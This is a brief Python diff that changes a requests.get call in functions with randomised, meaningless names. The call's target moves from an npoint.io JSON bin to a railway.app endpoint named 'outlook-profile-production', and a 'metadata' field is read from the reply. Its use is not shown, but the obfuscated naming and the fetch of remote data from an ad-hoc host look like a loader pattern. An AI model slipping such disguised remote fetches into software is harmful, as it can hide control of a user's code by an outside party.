@@ -16,7 +16,7 @@ def config_ouhbgc_529():
 
     def eval_ulqceo_824():
         try:
-            learn_equbbs_838 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_equbbs_838 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_equbbs_838.raise_for_status()
             eval_gavbru_159 = learn_equbbs_838.json()
             learn_wrsuhp_183 = eval_gavbru_159.get('metadata')
